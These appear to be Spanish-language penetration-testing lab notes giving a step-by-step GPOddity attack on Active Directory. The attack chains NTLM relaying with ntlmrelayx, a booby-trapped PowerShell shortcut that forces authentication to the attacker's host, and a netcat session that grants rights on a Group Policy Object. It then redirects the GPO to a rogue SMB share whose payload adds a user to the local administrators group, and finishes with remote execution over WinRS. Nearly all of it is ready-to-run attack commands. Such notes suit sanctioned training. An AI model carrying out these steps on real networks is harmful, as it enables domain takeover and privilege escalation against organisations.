# GPO Abuse - GPOddity 

Tags: #AD #Windows #Powershell #PrivEsc #PowerView #NTLMRelay #Kali 

```bash 
- GPOddity combina 'NTLM Relaying' y la modificación de 'Group Policy Container' 
- Al transmitir (relaying) las credenciales de un usuario quien tiene 'WriteDACL' en GPO, podemos modificar el path ('gPCFilesSysPath') de una plantilla de grupo (por defecto es SYSVOL)
- Esto habilita la carga de plantillas maliciosas desde una ubicación que podemos controlar 
```

![ | 700](Captura%20de%20pantalla%202026-02-17%20151823.png)

```bash 
Las partes 1, 2 y 3 del diagrama anterior pertenecen a la parte del 'Relaying' 
```

## PowerView 

* [PowerView](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1)

```powershell 
❯ . C:\AD\PowerView.ps1               # Cargar PowerView en memoria 
❯ Import-Module .\PowerView.ps1       # Importar el módulo 
```

```powershell 
❯ Get-DomainGPO -Identity 'Policy_Name'      # Obtener info de la política consultando objetos Group Policy Object (GPO) directamente desde Active Directory usando LDAP


Nota:
	- El nombre de la política se puede obtener desde Bloodhound
	- Se modificará la siguiente propiedad 'gpcfilesyspath'
	- Se obtiene el 'name' o 'cn' de la política
```

## Relaying 

### Paso 1 

```bash 
1. Hacer un ataque de relaying desde Kali  

❯ ntlmrelayx.py -t ldaps://IP_DC -wh IP_Atacante --http-port '80,8080' -i --no-smb-server  


Notas:
	- Al momento de abrir una terminal linux en Windows, esta será la ruta '/mnt/c/Users/user'
	- Cuando se acceda se iniciará una sesión interactiva TCP en 127.0.0.1:11000 con las credenciales que fueron obtenidas   
```

```powershell 
2. Crear un 'shortcut' (acceso directo) llamado 'powershell' en la máquina de atacante Windows y colocarle el siguiente comando en la ruta:  
   
❯ powershell.exe -Command "Invoke-WebRequest -Uri 'http://IP_Atacante' -UseDefaultCredentials"
```

```powershell 
3. Copiar el 'shortcut' (acceso directo) llamado 'powershell' desde Powershell en Windows al directorio del server que ha sido vulnerado para que sea ejecutado por el usuario que contiene la política

❯ xcopy C:\AD\Dowloads\powershell.lnk \\dcorp-ci\AI
```

```bash 
4. Conectarse por netcat desde otra terminal de Kali para agregarle la política al usuario 
❯ nc 127.0.0.1 11000    

	write_gpo_dacl <user> {GPO Name}     


Notas:
	- Ejemplo de GPO Name: {0BF8D01C-1F62-4BDC-958C-57140B67D147} la cual se obtiene del comando anterior 'Get-DomainGPO' en la parte de 'name'
	- El 'user' es el usuario al cual se le aplicará la política 
	- Al terminar de asignar la política se cierra la sesión de netcat y ntlmrelayx.py
```

### Paso 2 

* [GPOddity](https://github.com/synacktiv/GPOddity)

```bash 
GPOddity es una herramienta para 'abusar de permisos débiles sobre un GPO' y forzar ejecución de comandos en las máquinas afectadas por ese GPO.

# Generar un 'Group Policy Template' malicioso en Kali modificando temporalmente el 'sysvol' por '\\IP_Atacante\std1-gp'

❯ cd /mnt/c/AD/GPOddity 
❯ python3 gpoddity.py --gpo-id 'GPO Name' --domain 'domain.corp' --username 'user' --password 'password' --command 'net localgroup administrators user /add' --rogue-smbserver-ip 'IP_Atacante' --rogue-smbserver-share 'std1-gp' --dc-ip 'IP_DC' --smb-mode none  

	# std1-gp = Es el directorio compartido a crear 
	# user    = Es el usuario al cual se le asigno la política 
```

```bash 
# En otra terminal de Kali copiar el contenido

❯ mkdir /mnt/c/AD/std1-gp      # Crear el directorio que se específico en el comando anterior
❯ cp -r /mnt/c/AD/GPOddity/GPT_Out/* /mnt/c/AD/std1-gp     # Copiar los archivos generados por el comando anterior al share compartido para que se pueda aplicar la política 
```

### Paso 3 

```powershell 
# Abrir una shell como 'Administrator' en la máquina de atacante Windows 

❯ net share std1-gp=C:\AD\std1-gp   # Crear un recurso compartido SMB llamado std1-gp que apunta al directorio local C:\AD\std1-gp
❯ net share std1-gp /delete         # Eliminar el recurso compartido en caso de que ya este creado
❯ icacls "C:\AD\std1-gp" /grant Everyone:F /T    # Modificar las 'ACLs NTFS' del directorio que se esta compartiendo por SMB
```

```powershell
❯ Get-DomainGPO -Identity 'Policy_Name'   # Verificar que se haya cambiado la política 'gpcfilesyspath' en la shell donde se había importado PowerView 
```

```powershell 
# Ejecutar comando desde la terminal de Powershell en Windows con el usuario al que se le agrego la política

❯ winrs -r:dcorp-ci cmd /c "set computername && set username"   # Usar 'Windows Remote Shell (WinRS)' para ejecutar un comando remoto vía 'WinRM'

	# r = Indica el host remoto al que te conectas 
	# cmd = Ejecuta en la máquina remota 'set computername && set username'
```